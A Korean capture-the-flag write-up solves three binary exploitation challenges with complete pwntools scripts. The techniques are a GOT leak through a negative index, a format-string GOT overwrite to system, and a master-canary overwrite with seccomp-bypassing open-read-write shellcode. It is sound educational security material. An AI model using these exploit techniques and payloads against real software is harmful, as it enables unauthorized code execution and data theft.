```
pwn 3/3
```

# 목차

1.  pwn / Wanna Play a Game?
    -   보호기법
    -   프로그램 분석
    -   익스플로잇 설계
    -   dec.py
2.  pwn / Yet Another Format String Bug
    -   보호기법
    -   프로그램 분석
    -   익스플로잇 설계
    -   dec.py
3.  pwn / Recover Your Vision
    -   보호기법
    -   프로그램 분석
    -   익스플로잇 설계
    -   dec.py

---

# pwn / Wanna Play a Game?

## 보호기법

```
[*] '/mnt/c/Users/a/Desktop/Wanna Play a Game/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

PIE가 꺼져있다.

## 프로그램 분석

```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdi
  __int64 v4; // [rsp+0h] [rbp-10h]

  setup(argc, argv, envp);
  printf("[*] NickName> ");
  if ( read(0, &username, 0x40uLL) == -1 )
  {
    perror("READ ERROR");
    exit(-1);
  }
  while ( 1 )
  {
    menu();
    v4 = read_int();
    printf("[*] Guess>");
    v3 = read_int();
    ((void (__fastcall *)(__int64))conv[v4 - 1])(v3);
  }
}
```

```
.data:0000000000404010 conv            dq offset easy 
.data:0000000000404018                 dq offset hard
```

v4가 1이면 `easy(v3)`가 실행되고, v4가 2면 `hard(v3)`가 실행된다. 익스에서 `easy`는 중요하지 않다.

```
unsigned __int64 __fastcall hard(__int64 a1)
{
  int i; // [rsp+14h] [rbp-2Ch]
  char path[8]; // [rsp+2Fh] [rbp-11h] BYREF
  char v4; // [rsp+37h] [rbp-9h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  strcpy(path, "<qz}<`{");
  v4 = 0;
  for ( i = 0; i <= 6; ++i )
    path[i] ^= 0x13u;
  if ( a1 == passcode )
  {
    puts("[+] WINNNN!");
    execve(path, 0LL, 0LL);
  }
  else
  {
    puts("[-] YOU ARE NOT WORTHY FOR A SHELL!");
  }
  change_passcode();
  return v5 - __readfsqword(0x28u);
}
```

``<qz}<`{`` 에서 XOR하는 것은 `/bin/sh` 문자열을 주지 않기 위해서로 보인다. `passcode`를 알 수 있으면 쉘을 딸 수 있다.

## 익스플로잇 설계

`main`의 v4가 long long int 형이므로 음수 입력이 가능하다. conv가 bss에 있으므로 음수 입력으로 `puts@got`에 도달할 수 있다. `passcode`도 bss에 있으므로 주소를 알 수 있다. v3에 `passcode` 주소를 입력하면 `passcode`를 알 수 있다. `hard`를 실행시켜 쉘을 땄다.

## dec.py

```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process('./chall')
HOST = "2bed32f51bfbd4cf0f5b786d12cbf9b6.chal.ctf.ae"
p = remote(HOST, 443, ssl=True, sni=HOST)
e = ELF('./chall')

p.sendafter(b'> ', b'a')
p.sendafter(b'> ', str(((e.got['puts'] - e.sym['conv']) // 8) + 1).encode())
p.sendafter(b'> ', str(e.sym['passcode']).encode())
passcode = u64(p.recvn(8))
print(passcode)
#gdb.attach(p)
p.sendafter(b'> ', b'2')
p.sendafter(b'> ', str(passcode).encode())
p.interactive()
```

---

# Yet Another Format String Bug

## 보호기법

```
[*] '/mnt/c/Users/a/Desktop/Yet Another Format String Bug/yet_another_fsb'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    Stripped:   No
```

Partial RELRO이고, canary 없고, PIE가 꺼져있다.

## 프로그램 분석

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[270]; // [rsp+0h] [rbp-110h] BYREF
  __int16 v5; // [rsp+10Eh] [rbp-2h]

  v5 = 0;
  setup(argc, argv, envp);
  do
  {
    read(0, buf, 0xFFuLL);
    printf(buf);
  }
  while ( v5 );
  return 0;
}
```

0xff 만큼 입력을 받고, 그대로 출력한다. `FSB` 취약점이 있다. v5가 0이 아니라면 계속 실행할 수 있다.

## 익스플로잇 설계

스택에 있는 값을 봤을 때, 한 번의 `FSB`로는 쉘을 딸 수 없었다. 그래서 v5를 변조하는 과정이 필요하다.

```
pwndbg> x/50gx $rsp
0x7fffffffc700: 0x0000000000000040      0x00007fffffffc7e0
0x7fffffffc710: 0x00007fffffffc820      0x00007ffff7fe068d
0x7fffffffc720: 0x0000000000000002      0x218c032900000000
0x7fffffffc730: 0x000000000000000a      0x0000000000000040
0x7fffffffc740: 0x0000000001200000      0xffffffffffffffff
0x7fffffffc750: 0x0000000000140000      0x000000000000000c
0x7fffffffc760: 0x0000000000000040      0x000000000000000c
0x7fffffffc770: 0x000000000000c000      0x0000000000000800
0x7fffffffc780: 0x0000000000000800      0x00000000009a0000
0x7fffffffc790: 0x0000000001340000      0x0000000001340000
0x7fffffffc7a0: 0x0000000000000100      0x00007fffffffc7d8
0x7fffffffc7b0: 0x0000009a00000006      0x0000000000000000
0x7fffffffc7c0: 0x0000000000000000      0x0000000000000000
0x7fffffffc7d0: 0x0000000000000000      0x0000000000000000
0x7fffffffc7e0: 0x0000000000000000      0x0000000000000000
0x7fffffffc7f0: 0x0000000000000000      0x00007ffff7fe6cc0
0x7fffffffc800: 0x0000000000000000      0x00007fffffffc938
0x7fffffffc810: 0x00007fffffffc8b0      0x00007ffff7dfac88
```

`$rsp + 0x10`에 스택 관련 주소가 있다. 여길 1바이트 덮어서 v5를 가르키게 하면 v5를 변조할 수 있다. 1바이트를 `\x3e`로 덮었을 때 가능한 경우가 있음을 확인했다. 스택에는 ASLR이 걸려있어서 항상 base 주소가 달라지기 때문에 1/16 브루트포싱이 필요하다.  
그리고 문제에서 도커파일을 주지 않았다. 스택에 있는 값은 구축된 환경에 따라 다를 수 있기 때문에 로컬에서 분석할 때 스택에 값이 있다고 리모트 환경에 반드시 있지 않아 꽤나 도박성 익스이다. 하지만 운이 좋게 그대로 스택 관련된 값이 있었다.  
이렇게 v5를 변조해 `FSB`를 무한히 실행할 수 있다. 그 후 %p를 통해 libc\_base를 구하고, printf의 got을 system 주소로 바꾸고 /bin/sh를 입력하면 쉘을 딸 수 있다.

## dec.py

```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.bits = 64

HOST = "227823158c9de5e8d4b2cffaf1bc60fc.chal.ctf.ae"
l = ELF('./libc.so.6')

while True:
    #p = process('./yet_another_fsb')
    p = remote(HOST, 443, ssl=True, sni=HOST)
    e = ELF('./yet_another_fsb')

    payload = b'%c%8$hhn'.ljust(0x10, b'\x00') + b'\x3e'
    p.send(payload)
    msg = p.recvn(1)
    if msg == b'0': 
        break
    p.close()

#gdb.attach(p,'b *{}'.format(0x00000000004011ef))
payload = b'%3$p\n\x00'

p.send(payload)
l.address = int(p.recvline()[:-1], 16) - (0x7ff5229fd981 - 0x7ff5228f5000)
print(hex(l.address))

payload = fmtstr_payload(6, {e.got['printf']: l.sym['system']})
p.send(payload)
p.send(b'/bin/sh\x00')
p.interactive()
```

---

# Recover Your Vision

## 보호기법

```
[*] '/mnt/c/Users/a/Desktop/Recover Your Vision/blind'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x3fe000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

Partial RELRO이고, NX가 꺼져있고, PIE가 없다.

```
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0011
 0009: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0011
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

read, write, open, close, exit, exit\_group만 허용한다.

## 프로그램 분석

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  pthread_t newthread[2]; // [rsp+0h] [rbp-10h] BYREF

  newthread[1] = __readfsqword(0x28u);
  setup();
  puts("[*] Can you escape my jail?");
  if ( pthread_create(newthread, 0LL, (void *(*)(void *))vuln, 0LL) )
    exit(1);
  pthread_join(newthread[0], 0LL);
  return 0;
}
```

쓰레드로 `vuln`을 실행한다.

```C
int __fastcall vuln(void *a1)
{
  size_t nbytes; // [rsp+18h] [rbp-88h] BYREF
  char buf[120]; // [rsp+20h] [rbp-80h] BYREF
  unsigned __int64 v4; // [rsp+98h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  nbytes = 0LL;
  printf("[*] Buffer: %p\n", buf);
  printf("[*] What is the length of your shellcode: ");
  __isoc99_scanf("%d", &nbytes);
  getchar();
  printf("[*] Escape> ");
  disable();
  read(0, buf, nbytes);
  close(0);
  return close(1);
}
```

buf의 주소를 알려준다. 원하는 만큼 입력할 수 있어 `bof`가 발생한다. `disable`은 seccomp을 설정하는 함수이다. 그리고 stdin과 stdout을 닫는다.

## 익스플로잇 설계

우선 canary를 뚫어야 한다. 스레드 함수에서 선언된 변수는 일반적인 함수와 달리 TLS와 인접한 영역에 할당된다. 그러나 버퍼를 할당할 때 TLS 영역에 존재하는 마스터 카나리 값을 참조한다는 점은 동일하다. 따라서 마스터 카나리를 덮으면 된다.  
그리고 seccomp에 의해 system, execve 실행이 안 되므로 orw 쉘코딩으로 flag를 읽는다. 이 때 write는 stderr를 이용해야 출력을 볼 수 있다.

## dec.py

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.arch = 'amd64'
context.bits = 64

HOST = "c272d8dabe49243f7ba48e2187d11f4d.chal.ctf.ae"
#p = process('./blind')
p = remote(HOST, 443, ssl=True, sni=HOST)
l = ELF('./libc.so.6')

shellcode = asm(
    "run_sh:\n"
    "push 0x7478\n"
    "mov rax, 0x742E67616C662F2E \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = './flag.txt'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('./flag.txt', RD_ONLY, NULL)\n"

    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"

    "mov rdi, 2        # rdi = 2 ; fd = stderr\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n")
print(shellcode)

p.recvuntil(b'Buffer: ')
buf = int(p.recvline()[:-1], 16)
print(hex(buf))
sz = (0x7f36b0efa6c0 - 0x7f36b0ef9e40 + 0x30)
print(hex(buf + sz))

#
# gdb.attach(p, 'b *{}'.format(0x000000000040140b))
p.sendlineafter(": ", str(sz).encode())
payload = shellcode.ljust(0x78, b'\x00') + p64(buf + sz - 0x30) + b'a' * 8 + p64(buf)
payload += p64(buf + sz - 0x30) * ((sz - len(payload)) // 8)
p.sendafter(b'> ', payload)
p.interactive()
```